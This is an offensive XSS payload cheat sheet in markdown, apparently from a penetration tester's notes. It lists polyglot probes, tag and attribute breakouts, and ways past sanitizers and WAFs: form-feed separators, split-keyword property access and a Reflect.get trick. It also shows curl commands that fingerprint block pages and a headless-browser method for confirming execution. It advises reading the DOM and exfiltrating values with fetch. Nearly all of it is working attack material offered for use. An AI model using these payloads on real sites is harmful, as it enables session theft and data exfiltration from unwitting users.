---
title: "Payloads: XSS"
type: payloads
tags: [payloads, xss, web, client-side]
sources: []
date_created: 2026-06-05
date_updated: 2026-07-21
---

# Payloads: XSS

Reflected/stored/DOM probes + sanitizer/CSP bypasses. See [[techniques/web/xss]].

## Polyglots (context-agnostic first probes)
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
'"><img src=x onerror=alert(document.domain)>
"><svg onload=alert(1)>
```

## Attribute / tag breakouts
```
" autofocus onfocus=alert(1) x="
'-alert(1)-'
</textarea><script>alert(1)</script>
javascript:alert(1)      # href/src sinks
```

## DOM sinks to grep
```
innerHTML  outerHTML  document.write  eval  setTimeout(string)  location  srcdoc
.html()  $()  v-html  dangerouslySetInnerHTML
```

## Sanitizer / WAF bypass
```
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<img src=x onerror=alert`1`>
<details open ontoggle=alert(1)>
<x oNcliCk=alert(1)>click            # case
<script>alert(1)</script>       # unicode escape
data:text/html,<script>alert(1)</script>
```

### Attribute-separator whitespace (beats `on\w+=` WAF regexes)

HTML5 defines FIVE space characters as valid separators between a tag name and an
attribute: TAB `%09`, LF `%0A`, **FF `%0C`**, CR `%0D`, SPACE `%20`. WAF rules for
`on*=` handlers are routinely written against space/tab/newline/`/` and **miss form feed**,
while every browser accepts it. Try all five before concluding a handler is filtered:

```
<svg%09onload=fetch('/x')>     <svg%0Aonload=fetch('/x')>
<svg%0Conload=fetch('/x')>     <-- form feed: the one blocklists forget
<svg%0Donload=fetch('/x')>     <svg/onload=fetch('/x')>
```

Confirm the byte SURVIVES into the response (`xxd` the reflected region) - a WAF that strips
it, or an app that normalises it, produces `<svgonload=` which is just an unknown tag name.

**Keyword blocklists are the weak layer, not the handler rule.** When `alert`/`eval`/
`document.`/`this.` are filtered, `fetch(` is usually not - and `fetch()` alone reads and
transmits page content, so blocking keywords does not contain impact. Probe which JS tokens
pass before assuming the sink is dead. Do not assume the usual obfuscation helpers survive:
`atob(` and `setTimeout(` are themselves common blocklist entries, and `Function('...')` can
pass while `Function('...')()` is blocked (the rule matches the invocation, not the name).

**Split the keyword - a literal blocklist cannot see it.** These filters string-match, so
build the blocked identifier at runtime:

```js
top['docu'+'ment']['domain']      // 'document' never appears in the request
top['docu'+'ment']['coo'+'kie']
top['al'+'ert'](1)
```
Anything reachable as a property survives this way. Try it before writing off a sink.

### Fingerprint WHICH filter blocked you, by block-page size

Stacked filters (CDN + host WAF) enforce different rules, and mapping them as one set
produces contradictory results. Every layer serves its own block page, so its **byte length
identifies it** - baseline each one, then classify every 403 by `len`:

```bash
curl -s "$T/?p=<svg onload=alert(1)>" | wc -c    # e.g. 1659 = host WAF (plugin-level)
curl -s "$T/?p=<script>alert(1)</script>" | wc -c # e.g. 5482 = CDN managed ruleset
```

This is what makes the rule map trustworthy, and it changes the conclusion: one real case had
the CDN blocking every DOM **write** sink (`innerHTML`, `textContent`, `title`, `style`,
`document.write`) while DOM **reads** passed untouched. **No `alert()` is possible there, yet
XSS is fully exploitable** - read the DOM and exfiltrate with `fetch('/canary-'+value)`.
Never conclude "not exploitable" from a failing `alert()`; test a read+exfil payload first.

### Proving execution without an external listener

`//host` inside an HTTPS page resolves to `https://`, so a plain-HTTP callback listener
never completes even when the handler DID run - a classic false negative. Prove execution
same-origin instead, with the browser as the witness:

```bash
chromium --headless=new --no-sandbox --log-net-log=/tmp/net.json \
  --user-agent='Mozilla/5.0 ... Chrome/131.0.0.0 Safari/537.36' \
  --virtual-time-budget=15000 --dump-dom "<target-with-payload>" >/dev/null
grep -a 'your-unique-path' /tmp/net.json      # a request = the JS ran
```

Payload: `onload=fetch('/<unique-canary-path>')`. The path exists nowhere on the target, so a
request to it can only come from injected script. Use a REAL browser UA - the default
headless UA is commonly served a CDN block page, which silently invalidates the test.

## CSP bypass leads
```
JSONP endpoint on allowed origin · unsafe-inline · base-uri missing · object-src missing -> <object data>
'nonce' reuse · angular/vue gadget if framework on page
```


## `Reflect.get()` retrieves a blocklisted function with no property-access token in the payload

A keyword blocklist that catches both the bare name (`alert`) and its split/concatenated
bracket form (`obj['al'+'ert']`) is matching the property-ACCESS syntax, not just the name.
`Reflect.get(obj, name)` passes the property name as an ordinary string function argument, so no
`.prop` or `['prop']` access pattern ever appears anywhere in the payload, and the rule misses it:

```
<svg onload=Reflect['get'](top,'ale'+'rt')(top['docu'+'ment']['domain'])>
```

Use when a target's split-keyword form (already a known bypass) is itself being caught by a
smarter rule; this is one layer past that.

## Wired sub-techniques

<!-- auto-wired: context-reachable sub-technique pages -->
- [[crlf]]
- [[crlf-injection]]
- [[css-injection]]
- [[csv-injection]]
- [[xs-leak]]

<!-- promoted-slug: when-a-keyword-blocklist-also-catches-the-split-concatenated -->
